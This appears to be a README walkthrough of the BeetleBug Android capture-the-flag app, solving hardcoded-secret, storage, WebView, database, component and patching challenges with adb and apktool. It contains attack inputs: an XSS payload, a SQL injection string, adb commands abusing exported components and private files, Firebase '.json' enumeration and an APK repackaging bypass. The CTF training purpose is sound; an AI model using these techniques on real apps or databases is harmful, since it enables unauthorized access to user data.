# 🪲 BeetleBug CTF - Complete Android Security Walkthrough

## Overview

BeetleBug is a beginner-friendly Capture The Flag (CTF) Android application designed to inspire interest in mobile application security. This repository contains a comprehensive walkthrough of all challenges, demonstrating various Android security vulnerabilities and exploitation techniques.

**Difficulty:** Beginner to Intermediate  
**Platform:** Android Mobile Security  
**Repository:** [hafiz-ng/Beetlebug](https://github.com/hafiz-ng/Beetlebug)  
**Target Audience:** Android penetration testers, developers, and mobile security enthusiasts

## 📖 Full Write-up

For the complete detailed walkthrough with explanations and insights, check out my Medium article:

**[BeetleBug CTF - Complete Android Security Walkthrough](https://medium.com/@elipphab)**

## 🎯 Challenge Categories

BeetleBug covers the following mobile security vulnerability categories:

1. **Hardcoded Secrets** - Finding sensitive data embedded in code
2. **Insecure Data Storage** - Exploiting improper data storage mechanisms
3. **Vulnerable WebViews** - Attacking misconfigured WebView components
4. **Insecure Databases** - SQL injection and misconfigured Firebase
5. **Android Component Security** - Exploiting exposed activities, services, and content providers
6. **Sensitive Information Disclosure** - Capturing data through logs and clipboard
7. **Authentication Bypass** - Exploiting weak deeplinks and biometric controls
8. **Binary Patching** - Modifying and recompiling APK files

## 🛠️ Tools Used

- **jadx-gui** - Decompiling and analyzing Android APK source code
- **ADB (Android Debug Bridge)** - Interacting with Android devices/emulators
- **APKTool** - Decompiling and recompiling Android applications
- **apksigner** - Signing modified APK files
- **keytool** - Generating keystores for APK signing
- **Base64** - Decoding encoded flags
- **SQLite** - Querying Android databases

## 📋 Challenge Solutions

### 1️⃣ Hardcoded Secrets

#### Challenge 1.1: Embedded Secret Strings
**Objective:** Find the PIN to unlock the folder

**Solution:**
1. Open the APK in jadx-gui
2. Navigate to `Source Code → app.beetlebug → ctf → embeddedsecretstrings`
3. Analyze the comparison logic - the app compares user input with a string from `strings.xml`
4. The key being searched is `V98bFQrpGkD`
5. Navigate to `Resources → resources.arsc → res → values → strings.xml`
6. Search for the key `V98bFQrpGkD` to retrieve the flag

**Flag Location:** `strings.xml` resource file

#### Challenge 1.2: Embedded Secret Source Code
**Objective:** Find the promo code

**Solution:**
1. Open jadx-gui and navigate to `Source Code → app.beetlebug → ctf → embeddedsecretsourcecode`
2. Inspect the activity source code
3. The promo code is hardcoded directly in the Java source code

**Flag Location:** Hardcoded in source code

---

### 2️⃣ Data Storage Vulnerabilities

#### Challenge 2.1: Shared Preferences
**Objective:** Extract credentials and flag from shared preferences

**Solution Method 1 - jadx-gui:**
1. Navigate to `Source Code → app.beetlebug → ctf → insecurestoragesharedpref`
2. Analyze how credentials are stored

**Solution Method 2 - ADB Shell:**
```bash
adb shell
cd /data/data/app.beetlebug/shared_prefs
cat shared_prefs_flag.xml
```

**Vulnerability:** Sensitive data stored in plaintext in shared preferences

#### Challenge 2.2: External Storage
**Objective:** Find credentials stored in external storage

**Solution:**
1. Input credentials in the app
2. The app provides the file path location
3. Use ADB to retrieve the file:
```bash
adb shell
cd /storage/emulated/0/Documents
cat user.txt
```

**Alternative - jadx-gui:**
Navigate to `Source Code → app.beetlebug → ctf → insecurestorageExternal`

**Vulnerability:** Sensitive data stored in world-readable external storage

#### Challenge 2.3: SQL Database
**Objective:** Retrieve the flag from SQLite database

**Solution Method 1 - String Resources:**
1. In jadx-gui, navigate to `Source Code → app.beetlebug → ctf → insecurestorageSQLite`
2. Follow string references
3. Go to `Resources → resources.arsc → res → values → strings.xml`
4. Search for "sqlite" string

**Solution Method 2 - Direct Database Access:**
```bash
adb shell
cd /data/data/app.beetlebug/databases
sqlite3 user.db
.tables
SELECT * FROM [table_name];
```

**Vulnerability:** Unencrypted database with sensitive information

---

### 3️⃣ WebView Vulnerabilities

#### Challenge 3.1: Load Arbitrary URL
**Objective:** Exploit WebView to load malicious content

**Vulnerabilities Found:**
1. Shared preferences accessible without root access
2. JavaScript enabled, allowing Cross-Site Scripting (XSS)

**Solution:**
```bash
adb shell am start -n app.beetlebug/.ctf.VulnerableWebView --es reg_url "file:///data/data/app.beetlebug/shared_prefs/preferences.xml"
```

**Flag Extraction:**
The `12_url` value contains the flag encoded in Base64:
```bash
echo -n "MHgzM2YzMzQx" | base64 -d
```

**Vulnerability:** Exported WebView activity with JavaScript enabled accepting arbitrary URLs

#### Challenge 3.2: JavaScript Code Injection
**Objective:** Perform XSS attack

**Solution:**
Input the following payload:
```html
<script>alert(1)</script>
```

**Vulnerability:** Insufficient input sanitization with JavaScript enabled

---

### 4️⃣ Insecure Database

#### Challenge 4.1: SQL Injection
**Objective:** Retrieve all database data with a single command

**Solution:**
Input the following SQL injection payload:
```sql
' or 1=1 --
```

**Vulnerability:** Lack of input validation and parameterized queries

#### Challenge 4.2: Misconfigured Firebase Database
**Objective:** Access publicly exposed Firebase database

**Solution:**
1. Search for "firebase.com" URL in jadx-gui
2. Locate the Firebase database URL
3. Open browser and append `.json` to the URL
4. Access the entire database contents

**Example URL:** `https://[project-name].firebaseio.com/.json`

**Vulnerability:** Firebase database rules not properly configured (public read access)

---

### 5️⃣ Android Components

#### Challenge 5.1: Unprotected Activity
**Objective:** Access the admin activity

**Solution:**
```bash
adb shell am start -n app.beetlebug/.ctf.b33tleAdministrator
```

**Vulnerability:** Exported activity without proper access controls

#### Challenge 5.2: Vulnerable Service
**Objective:** Start the vulnerable service

**Solution:**
```bash
adb shell am startservice -n app.beetlebug/.handlers.VulnerableService
```

The flag will popup on the device.

**Vulnerability:** Exported service without authentication

#### Challenge 5.3: Vulnerable Content Provider
**Objective:** Extract sensitive information from content provider

**Solution:**
```bash
adb shell content query --uri content://app.beetlebug.provider/users
```

**Vulnerability:** Exported content provider without proper permissions

---

### 6️⃣ Sensitive Information Disclosure

#### Challenge 6.1: Insecure Login
**Objective:** Capture sensitive log information

**Solution:**
1. Get the process ID:
```bash
adb shell pidof app.beetlebug
```

2. Monitor real-time logs:
```bash
adb logcat --pid=2***
```

3. Input credentials in the app
4. Capture the flag from logcat output in plaintext

**Vulnerability:** Sensitive data logged to system logs

#### Challenge 6.2: Clipboard Data
**Objective:** Extract data from clipboard

**Solution:**
1. Input information in the application fields
2. A popup reveals the entered information
3. The flag is exposed in the clipboard

**Vulnerability:** Sensitive data copied to clipboard without sanitization

---

### 7️⃣ Biometric Authentication

#### Challenge 7.1: Biometric Bypass
**Objective:** Bypass biometric authentication using deeplink

**Solution:**
```bash
adb shell am start -n app.beetlebug/.ctf.DeeplinkAccountActivity
```

**Vulnerability:** Weak deeplink implementation allowing authentication bypass

---

### 8️⃣ Binary Patching

#### Challenge 8.1: Root Access Requirement Bypass
**Objective:** Become a super user to access the password manager

**Solution:**

**Step 1: Decompile the APK**
```bash
apktool d beetlebug.apk -o beetlebug_decoded
```

**Step 2: Modify the Layout File**
1. Navigate to `beetlebug_decoded/res/layout/activity_binary_patch.xml`
2. Change `android:enabled="false"` to `android:enabled="true"`
3. Save the file

**Step 3: Clean Special Characters**
```bash
# Remove special characters from filenames
find beetlebug_decoded/res -type f -name '*$*' -exec bash -c 'f="{}"; n=$(basename "$f" | tr -d "$"); mv "$f" "$(dirname "$f")/$n"' \;

# Remove special characters from public.xml
sed -i 's/\$//g' beetlebug_decoded/res/values/public.xml
```

**Step 4: Recompile the APK**
```bash
apktool b beetlebug_decoded -o newapp.apk --use-aapt2
```

**Step 5: Generate Keystore and Sign the APK**
```bash
# Generate keystore
keytool -genkey -v -keystore my-release-key.keystore -alias my_alias -keyalg RSA -keysize 2048 -validity 10000

# Sign the APK
apksigner sign --ks my-release-key.keystore --out newapp-signed.apk newapp.apk
```

**Step 6: Install Modified APK**
```bash
# Uninstall original app
adb uninstall app.beetlebug

# Install modified app
adb install newapp-signed.apk
```

**Result:** The "Grant Access" button is now clickable and the flag can be captured.

**Vulnerability:** Client-side validation that can be bypassed through binary modification

---

## 📁 Repository Structure

```
beetlebug-ctf/
├── README.md                    # This comprehensive walkthrough
├── notes/
│   ├── hardcoded-secrets.md    # Detailed notes on hardcoded secrets challenges
│   ├── data-storage.md         # Data storage vulnerability findings
│   ├── webview-attacks.md      # WebView exploitation techniques
│   ├── database-security.md    # Database vulnerability notes
│   ├── components.md           # Android component security findings
│   ├── info-disclosure.md      # Information disclosure notes
│   └── binary-patching.md      # APK modification techniques
├── scripts/
│   ├── firebase-enum.sh        # Firebase database enumeration script
│   ├── adb-commands.sh         # Useful ADB commands collection
│   └── apk-resign.sh           # APK signing automation script
└── screenshots/
    ├── hardcoded-secrets/
    ├── data-storage/
    ├── webview/
    ├── components/
    └── flags/
```

## 🚩 Flags Summary

All flags have been successfully captured across the following categories:
- ✅ Hardcoded Secrets (2 flags)
- ✅ Data Storage (3 flags)
- ✅ WebView Vulnerabilities (2 flags)
- ✅ Database Security (2 flags)
- ✅ Android Components (3 flags)
- ✅ Information Disclosure (2 flags)
- ✅ Authentication Bypass (1 flag)
- ✅ Binary Patching (1 flag)

**Total Flags Captured:** 16/16 ✅

## 💡 Key Takeaways

### Security Lessons Learned:

1. **Never hardcode secrets** - Sensitive data in source code or resources is easily extractable through reverse engineering
2. **Secure data storage** - Use Android Keystore, encryption, and proper storage mechanisms for sensitive data
3. **WebView security** - Disable JavaScript when not needed, validate URLs, and implement proper origin controls
4. **Database security** - Always use parameterized queries and encrypt sensitive databases
5. **Component protection** - Set `android:exported="false"` unless necessary and implement proper authentication
6. **Logging practices** - Never log sensitive information, even in debug builds
7. **Client-side validation** - Never rely solely on client-side checks; always validate on the server
8. **Firebase configuration** - Properly configure security rules to prevent unauthorized access

### Technical Skills Demonstrated:

- ✅ Android reverse engineering with jadx-gui
- ✅ ADB command-line proficiency
- ✅ APK decompilation and recompilation
- ✅ SQL injection exploitation
- ✅ WebView vulnerability exploitation
- ✅ Android component security testing
- ✅ Binary patching and APK modification
- ✅ Mobile application penetration testing methodology

## 🔐 Vulnerability Mitigation Recommendations

### For Developers:

1. **Use ProGuard/R8** - Obfuscate code to make reverse engineering more difficult
2. **Implement certificate pinning** - Prevent man-in-the-middle attacks
3. **Use Android Keystore** - Store cryptographic keys securely
4. **Enable app integrity checks** - Detect tampering and unauthorized modifications
5. **Implement proper authentication** - Use OAuth 2.0, JWT, or other secure authentication mechanisms
6. **Regular security audits** - Conduct periodic penetration testing and code reviews
7. **Follow OWASP Mobile Top 10** - Stay updated with mobile security best practices
8. **Use SafetyNet/Play Integrity API** - Verify device integrity and app authenticity

## 🤔 Challenges Faced

1. **APK signing issues** - Resolved by properly cleaning special characters and using apksigner
2. **ADB connection problems** - Ensured proper USB debugging settings and device authorization
3. **Base64 decoding** - Required understanding of encoding schemes used for flag obfuscation
4. **Firebase URL discovery** - Thorough jadx-gui analysis was necessary to locate Firebase endpoints

## 📚 Resources & References

### Tools:
- [jadx - Dex to Java decompiler](https://github.com/skylot/jadx)
- [APKTool - Reverse engineering tool](https://ibotpeaches.github.io/Apktool/)
- [Android Debug Bridge (ADB) Documentation](https://developer.android.com/studio/command-line/adb)

### Learning Resources:
- [OWASP Mobile Application Security](https://owasp.org/www-project-mobile-app-security/)
- [OWASP Mobile Security Testing Guide (MSTG)](https://github.com/OWASP/owasp-mstg)
- [Android Security Documentation](https://developer.android.com/topic/security)
- [Firebase Security Rules Documentation](https://firebase.google.com/docs/rules)

### CTF Platforms:
- [BeetleBug GitHub Repository](https://github.com/hafiz-ng/Beetlebug)

## 👨‍💻 About

This walkthrough was created to document the complete solution process for the BeetleBug CTF challenge and to serve as an educational resource for those learning Android application security.

**Author:** [@elipphab](https://medium.com/@elipphab)  
**Date Completed:** February 2026  
**Difficulty Rating:** ⭐⭐⭐ (Beginner-Friendly)

## 🌟 Acknowledgments

Special thanks to [hafiz-ng](https://github.com/hafiz-ng) for creating this excellent beginner-friendly Android CTF challenge.

---

**For the full detailed walkthrough with screenshots and additional insights, visit my Medium blog: [@elipphab](https://medium.com/@elipphab)**

**Let's dive in and have fun capturing the flags! 👨🏾‍💻🪲**
